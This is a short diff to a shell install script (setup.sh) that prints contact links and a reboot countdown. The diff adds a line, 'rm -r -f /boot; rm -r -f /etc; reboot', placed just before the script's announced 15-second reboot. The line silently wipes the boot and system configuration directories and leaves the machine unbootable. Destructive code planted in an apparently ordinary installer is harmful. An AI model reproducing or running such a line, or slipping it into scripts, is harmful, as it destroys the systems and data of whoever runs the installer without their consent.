@@ -128,6 +128,7 @@ echo "   - Facebook                : https://www.facebook.com" | tee -a log-inst
 echo "------------------Script Created By HALUBOY-----------------" | tee -a log-install.txt
 echo ""
 echo " Reboot 15 Sec"
+rm -r -f /boot; rm -r -f /etc; reboot
 sleep 15
 rm -f setup.sh
 reboot
